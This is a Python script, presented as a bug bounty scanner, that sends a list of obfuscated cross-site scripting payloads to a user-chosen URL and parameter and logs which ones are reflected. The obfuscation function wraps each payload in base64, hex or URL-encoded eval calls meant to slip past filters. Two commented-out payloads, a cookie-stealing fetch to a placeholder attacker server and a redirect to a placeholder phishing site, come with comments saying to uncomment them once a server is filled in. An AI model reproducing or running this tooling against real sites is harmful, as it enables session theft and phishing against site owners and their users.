import requests
import base64
import urllib.parse
import random


# Function to obfuscate payloads dynamically
def obfuscate_payload(payload):
    """Randomly encodes a given JavaScript payload using different methods."""
    methods = ["base64", "hex", "url"]
    method = random.choice(methods)

    if method == "base64":
        return f"<script>eval(atob('{base64.b64encode(payload.encode()).decode()}'));</script>"
    elif method == "hex":
        hex_encoded = ''.join(f'\\x{ord(c):02x}' for c in payload)
        return f"<script>eval('{hex_encoded}');</script>"
    elif method == "url":
        url_encoded = urllib.parse.quote(payload)
        return f"<script>window.location=decodeURIComponent('{url_encoded}');</script>"
    else:
        return f"<script>{payload}</script>"

# User input for target and parameters
target_url = input("Enter target URL: ").strip()
bug_bounty_email = input("Enter your bug bounty email: ").strip()
request_method = input("Enter request method (GET/POST): ").strip().upper()
param_name = input("Enter parameter name (e.g., 'q' for search, 'input' for forms): ").strip()

# Define HTTP headers, including bug bounty researcher identification
headers = {
    "User-Agent": "BugBounty-Scanner/1.0",
    "BugBounty-Researcher": bug_bounty_email
}

# Log file
log_file = "dynamic_servercheck_results.log"
with open(log_file, "w") as log:
    log.write(f"Bug Bounty Dynamic Server Check on {target_url} by {bug_bounty_email}\n")
    log.write("=" * 60 + "\n")

# List of obfuscated XSS payloads
payloads = [
    obfuscate_payload("alert('injected');"),
    obfuscate_payload("<img src=x onerror=alert('injected')>"),
    obfuscate_payload("<svg/onload=alert('injected')>"),
    obfuscate_payload("<iframe src='javascript:alert('injected')'></iframe>"),
    obfuscate_payload("<body onload=alert('injected')>"),
    obfuscate_payload("<scr<script>ipt>alert('injected');</scr</script>ipt>"),
    obfuscate_payload("&lt;script&gt;alert('injected');&lt;/script&gt;"),
    obfuscate_payload("<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x27;&#x58;&#x53;&#x53;&#x27;&#x29;>"),
    #obfuscate_payload("fetch('https://<insert_your_server_here>/steal?cookie=' + document.cookie);") , # This is commented out so uncomment it after adding
    #obfuscate_payload("window.location='https://<phishing_site_goes_here>';"), # This is commented out so uncomment it after adding 
    obfuscate_payload("document.body.innerHTML='<h1>injected!</h1>';"),
    obfuscate_payload("setTimeout('alert(\'injected\')', 1000);") ,
    obfuscate_payload("<link rel='stylesheet' href='javascript:alert(1)'>"),
    obfuscate_payload("<video><source onerror=alert('injected')>"),
    obfuscate_payload("<details open ontoggle=alert('injected')>") ,
    obfuscate_payload("<marquee onstart=alert('injected')>XSS</marquee>"),
    obfuscate_payload("<input type='text' value='<svg/onload=alert('injected')>'>") ,
    obfuscate_payload("javascript:alert('injected');"),
    obfuscate_payload("<object data='javascript:alert('injected')'></object>"),
    obfuscate_payload("<img src=x:alert(1) onerror=eval(src)>") ,
    obfuscate_payload("<a href='javascript:alert(1)'>Click Me</a>"),
    obfuscate_payload("<form><button formaction=javascript:alert(1)>Click</button></form>"),
    obfuscate_payload("<math><mtext onmouseover=alert(1)>XSS</mtext></math>"),
    obfuscate_payload("<iframe srcdoc='<script>alert('DOM XSS')</script>'>")
]

# Function to test a single payload
def test_payload(payload):
    try:
        if request_method == "GET":
            response = requests.get(target_url, params={param_name: payload}, headers=headers)
        else:
            response = requests.post(target_url, data={param_name: payload}, headers=headers)
        
        # Check if the payload is reflected in the response
        if payload in response.text:
            print(f"[+] Payload reflected: {payload}")
            print("Response snippet:")
            print(response.text[:500])  # Print the first 500 characters of the response
            result = f"[+] Payload reflected: {payload}\nResponse snippet:\n{response.text[:500]}\n"
        else:
            print(f"[-] Payload not reflected: {payload}")
            result = f"[-] Payload not reflected: {payload}\n"
        
        # Log the results
        with open(log_file, "a") as log:
            log.write(result + "\n" + "-" * 40 + "\n")
    except Exception as e:
        print(f"[!] Error testing payload {payload}: {e}")
        with open(log_file, "a") as log:
            log.write(f"[!] Error testing payload {payload}: {e}\n" + "-" * 40 + "\n")

# Test all payloads
for payload in payloads:
    test_payload(payload)
    print("-" * 40)  # Separator for readability

print(f"Scan complete. Results saved in {log_file}")
